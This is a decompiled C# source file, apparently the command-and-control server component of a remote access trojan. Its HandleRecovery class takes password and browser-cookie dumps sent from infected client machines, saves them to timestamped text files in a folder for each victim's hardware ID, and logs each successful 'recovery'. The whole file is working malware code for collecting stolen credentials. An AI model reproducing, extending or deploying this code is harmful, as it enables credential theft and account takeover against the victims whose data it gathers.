using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200006D RID: 109
	public class HandleRecovery
	{
		// Token: 0x06000300 RID: 768 RVA: 0x00020990 File Offset: 0x0001EB90
		public HandleRecovery(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
				string asString = unpack_msgpack.ForcePathObject("Password").AsString;
				string asString2 = unpack_msgpack.ForcePathObject("Cookies").AsString;
				if (string.IsNullOrWhiteSpace(asString) && string.IsNullOrWhiteSpace(asString2))
				{
					new HandleLogs().Addmsg("Client " + client.Ip + " has no passwords", Color.MediumPurple);
				}
				else
				{
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					File.WriteAllText(text + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString.Replace("\n", Environment.NewLine));
					File.WriteAllText(text + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", asString2);
					new HandleLogs().Addmsg(string.Concat(new string[]
					{
						"Client ",
						client.Ip,
						" recovered passwords successfully @ ClientsFolder \\ ",
						unpack_msgpack.ForcePathObject("Hwid").AsString,
						" \\ Recovery"
					}), Color.Purple);
				}
				if (client != null)
				{
					client.Disconnected();
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Red);
			}
		}
	}
}
